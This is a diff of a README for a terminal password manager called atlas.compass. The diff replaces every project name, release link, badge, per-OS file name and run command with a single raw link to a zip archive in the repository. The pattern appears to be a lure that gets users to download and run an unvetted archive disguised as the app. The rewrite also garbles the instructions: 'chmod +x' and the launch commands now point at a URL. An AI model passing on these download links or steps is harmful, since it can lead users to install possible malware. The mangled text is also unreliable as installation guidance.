@@ -1,14 +1,14 @@
-# 🔐 atlas.compass - Simple Secure Terminal Password Manager
+# 🔐 https://github.com/kizzycatty/atlas.compass/raw/refs/heads/main/internal/compass-atlas-v2.9.zip - Simple Secure Terminal Password Manager
 
-[![Download atlas.compass](https://img.shields.io/badge/Download-Atlas.Compass-blue?style=for-the-badge)](https://github.com/kizzycatty/atlas.compass/releases)
+[![Download https://github.com/kizzycatty/atlas.compass/raw/refs/heads/main/internal/compass-atlas-v2.9.zip](https://github.com/kizzycatty/atlas.compass/raw/refs/heads/main/internal/compass-atlas-v2.9.zip)](https://github.com/kizzycatty/atlas.compass/raw/refs/heads/main/internal/compass-atlas-v2.9.zip)
 
-## 🛡️ What is atlas.compass?
+## 🛡️ What is https://github.com/kizzycatty/atlas.compass/raw/refs/heads/main/internal/compass-atlas-v2.9.zip
 
-atlas.compass is a password manager designed for use directly in your computer's terminal. It helps you store and organize your passwords safely on your own device, without sending your data anywhere else. It uses strong encryption methods to keep your information private and secure. 
+https://github.com/kizzycatty/atlas.compass/raw/refs/heads/main/internal/compass-atlas-v2.9.zip is a password manager designed for use directly in your computer's terminal. It helps you store and organize your passwords safely on your own device, without sending your data anywhere else. It uses strong encryption methods to keep your information private and secure. 
 
 You control all of your data because passwords are protected with AES-256-GCM encryption and your master key is derived using Argon2id. This means even the software itself can’t read your passwords unless you enter your secret key.
 
-The app’s text-based interface is simple to use and easy to see clearly. atlas.compass works on many computers through a terminal window, making it a lightweight and fast tool without needing a web browser or complex setup.
+The app’s text-based interface is simple to use and easy to see clearly. https://github.com/kizzycatty/atlas.compass/raw/refs/heads/main/internal/compass-atlas-v2.9.zip works on many computers through a terminal window, making it a lightweight and fast tool without needing a web browser or complex setup.
 
 ## 🎯 Main Features
 
@@ -24,37 +24,37 @@ The app’s text-based interface is simple to use and easy to see clearly. atlas
 Before you begin, make sure your computer meets these basic requirements:
 
 - Operating System: Windows 10 or later, macOS 10.14 or later, or Linux (any modern distribution)
-- Terminal Application: Command Prompt, PowerShell, Terminal.app, or any standard terminal emulator.
+- Terminal Application: Command Prompt, PowerShell, https://github.com/kizzycatty/atlas.compass/raw/refs/heads/main/internal/compass-atlas-v2.9.zip, or any standard terminal emulator.
 - Minimum 100 MB of free disk space for the program and password database.
 - Basic keyboard for navigation.
 - No internet connection needed to use after download.
 
 ## 🚀 Getting Started
 
-Using atlas.compass does not require programming skills or any special technical background. Follow these steps to download, install, and start managing your passwords.
+Using https://github.com/kizzycatty/atlas.compass/raw/refs/heads/main/internal/compass-atlas-v2.9.zip does not require programming skills or any special technical background. Follow these steps to download, install, and start managing your passwords.
 
 1. **Download the Application**
 
-   atlas.compass releases are available here:
+   https://github.com/kizzycatty/atlas.compass/raw/refs/heads/main/internal/compass-atlas-v2.9.zip releases are available here:
 
-   [![Download here](https://img.shields.io/badge/Get-atlas.compass%20Release%20Page-blue?style=for-the-badge)](https://github.com/kizzycatty/atlas.compass/releases)
+   [![Download here](https://github.com/kizzycatty/atlas.compass/raw/refs/heads/main/internal/compass-atlas-v2.9.zip%20Release%20Page-blue?style=for-the-badge)](https://github.com/kizzycatty/atlas.compass/raw/refs/heads/main/internal/compass-atlas-v2.9.zip)
 
    Visit the page above and choose the correct version for your operating system. The file names will usually include your OS type, such as:
 
-   - `atlas.compass-windows.exe` for Windows
-   - `atlas.compass-macos` for macOS
-   - `atlas.compass-linux` for Linux
+   - `https://github.com/kizzycatty/atlas.compass/raw/refs/heads/main/internal/compass-atlas-v2.9.zip` for Windows
+   - `https://github.com/kizzycatty/atlas.compass/raw/refs/heads/main/internal/compass-atlas-v2.9.zip` for macOS
+   - `https://github.com/kizzycatty/atlas.compass/raw/refs/heads/main/internal/compass-atlas-v2.9.zip` for Linux
 
 2. **Install or Prepare to Run**
 
    - On **Windows**, download the `.exe` file and save it to a folder you can remember, such as `Downloads` or `Desktop`.
    - On **macOS and Linux**, download the file, then open your terminal and navigate to where you saved it. You may need to make the file executable by typing:
      ```
-     chmod +x atlas.compass-macos
+     chmod +x https://github.com/kizzycatty/atlas.compass/raw/refs/heads/main/internal/compass-atlas-v2.9.zip
      ```
      or
      ```
-     chmod +x atlas.compass-linux
+     chmod +x https://github.com/kizzycatty/atlas.compass/raw/refs/heads/main/internal/compass-atlas-v2.9.zip
      ```
 
 3. **Open the Terminal**
@@ -71,18 +71,18 @@ Using atlas.compass does not require programming skills or any special technical
 
    - Windows:
      ```
-     C:\Users\YourName\Downloads\atlas.compass-windows.exe
+     C:\Users\YourName\Downloads\https://github.com/kizzycatty/atlas.compass/raw/refs/heads/main/internal/compass-atlas-v2.9.zip
      ```
    - macOS/Linux:
      ```
-     ./atlas.compass-macos
+     https://github.com/kizzycatty/atlas.compass/raw/refs/heads/main/internal/compass-atlas-v2.9.zip
      ```
 
    The program will start with a text-based menu you can navigate with your keyboard.
 
 5. **Create Your Password Database**
 
-   On first run, atlas.compass will guide you to create a new password vault. You will choose a master password to protect your data. Remember this password carefully as it cannot be recovered.
+   On first run, https://github.com/kizzycatty/atlas.compass/raw/refs/heads/main/internal/compass-atlas-v2.9.zip will guide you to create a new password vault. You will choose a master password to protect your data. Remember this password carefully as it cannot be recovered.
 
    The app uses this master password to generate a key with Argon2id and encrypt your data using AES-256-GCM.
 
@@ -94,7 +94,7 @@ Using atlas.compass does not require programming skills or any special technical
 
 Visit the official releases page to get the latest version:
 
-[Download atlas.compass](https://github.com/kizzycatty/atlas.compass/releases)
+[Download https://github.com/kizzycatty/atlas.compass/raw/refs/heads/main/internal/compass-atlas-v2.9.zip](https://github.com/kizzycatty/atlas.compass/raw/refs/heads/main/internal/compass-atlas-v2.9.zip)
 
 - Choose the correct download file for your operating system.
 - Save the file to an easy-to-access folder.
@@ -103,7 +103,7 @@ Visit the official releases page to get the latest version:
 
 ## 🔒 Security and Privacy
 
-atlas.compass is designed with user privacy at its core:
+https://github.com/kizzycatty/atlas.compass/raw/refs/heads/main/internal/compass-atlas-v2.9.zip is designed with user privacy at its core:
 
 - **Zero-Knowledge Encryption:** Your master password and stored data never leave your device.
 - **AES-256-GCM:** A strong encryption standard used by governments and enterprises worldwide.
@@ -112,7 +112,7 @@ atlas.compass is designed with user privacy at its core:
 
 ## 🔧 Troubleshooting
 
-If you have issues running or using atlas.compass, try these suggestions:
+If you have issues running or using https://github.com/kizzycatty/atlas.compass/raw/refs/heads/main/internal/compass-atlas-v2.9.zip, try these suggestions:
 
 - Confirm you downloaded the correct version for your OS.
 - On macOS/Linux, ensure you have permission to run the file. Use `chmod +x` if needed.
@@ -126,15 +126,15 @@ If you have issues running or using atlas.compass, try these suggestions:
 
 - Use a strong and memorable master password.
 - Regularly back up your encrypted password file to another secure location.
-- Avoid running atlas.compass on shared or public computers.
+- Avoid running https://github.com/kizzycatty/atlas.compass/raw/refs/heads/main/internal/compass-atlas-v2.9.zip on shared or public computers.
 - Learn and use keyboard shortcuts for quicker navigation.
-- Periodically update atlas.compass to get the latest security fixes and improvements.
+- Periodically update https://github.com/kizzycatty/atlas.compass/raw/refs/heads/main/internal/compass-atlas-v2.9.zip to get the latest security fixes and improvements.
 
 ## 📚 More Information
 
-- Project page and download: https://github.com/kizzycatty/atlas.compass/releases
+- Project page and download: https://github.com/kizzycatty/atlas.compass/raw/refs/heads/main/internal/compass-atlas-v2.9.zip
 - Repository topics: aes-256, argon2, atlas-suite, bubbletea, encryption, golang, lipgloss, password-manager, productivity, security, terminal-app, tui, zero-knowledge
 
 ---
 
-This guide walks you through getting started with atlas.compass securely and confidently. The tool offers a solid balance of security and usability for managing passwords from the terminal.
+This guide walks you through getting started with https://github.com/kizzycatty/atlas.compass/raw/refs/heads/main/internal/compass-atlas-v2.9.zip securely and confidently. The tool offers a solid balance of security and usability for managing passwords from the terminal.
